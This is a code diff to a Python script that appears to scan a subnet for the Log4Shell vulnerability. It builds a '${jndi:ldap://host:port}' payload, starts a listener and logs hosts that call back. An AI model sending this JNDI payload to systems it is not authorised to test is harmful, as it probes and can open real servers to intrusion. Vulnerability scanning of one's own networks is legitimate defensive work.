@@ -18,12 +18,6 @@ from datetime import datetime
 from configparser import ConfigParser
 import subprocess, platform
 
-port = input('port number\n')
-host = input("Host IP address\n")
-payload = "${jndi:ldap://" + host + ":" + port + "}"
-protocol_list = ['http://']
-max_threads = 102
-
 def log(string):
     now = datetime.now()
     date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
@@ -39,20 +33,24 @@ def log(string):
 
 def web_server(host, port):
     global connection_flag
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, int(port)))
-        s.settimeout(None)
-        s.listen()
-        conn, addr = s.accept()
-        with conn:
-            log('Connected by: ' + addr[0])
-            print('Connected by: ', addr[0])
-            connection_flag = 1
-            while True:
-                data = conn.recv(1024)
-                if not data:
-                    break
-                conn.sendall(data)
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind((host, int(port)))
+            s.settimeout(None)
+            s.listen()
+            conn, addr = s.accept()
+            with conn:
+                log('Connected by: ' + addr[0])
+                print('Connected by: ', addr[0])
+                connection_flag = 1
+                while True:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    conn.sendall(data)
+        time.sleep(900)
+        s.close()
+
 
 def found(html, url):
     #webbrowser.open(url)
@@ -77,9 +75,9 @@ def mainloop(ip_addr, x):
                         found(response.content, (url + ':' + str(port)))
                     print(response)
                 except:
-                   pass# print('No Connection to ' + url + ":" + port + '\n')
+                   pass
     else:
-        print("No Response from: " + str(ip_addr) + str(x))
+        pass
 
 def pingOk(sHost):
     try:
@@ -112,19 +110,24 @@ def thread_out():
                             print("Scanning:" + thread.name)
                     time.sleep(.5)
 
+port = input('port number\n')
+host = input("Host IP address\n")
+payload = "${jndi:ldap://" + host + ":" + port + "}"
+protocol_list = ['http://']
+max_threads = 102
+
 ip_addr_input = input("Input Subnet: ex.192.168.89.\n")
 ip_addr = ip_addr_input.split(',')
 log("\n Starting Web Server")
 new_thread = threading.Thread(target = web_server, args=(host, port, ))
 new_thread.name = "Web Server"
 new_thread.start()
-log("Testing Web Server")
 enter = input("Copy & Paste: " + payload + "\n")
 log("Starting Services")
 log(payload)
 thread_out()
 
-while int(threading.active_count()) >= 2:
+while int(threading.active_count()) >= 3:
     os.system('cls' if os.name=='nt' else 'clear')
     print("Threads still running: " + str(threading.active_count()))
     time.sleep(10)
@@ -143,3 +146,4 @@ if connection_flag != 0:
 else:
     log('Connection logged, please see who connected.')
 print("Complete")
+
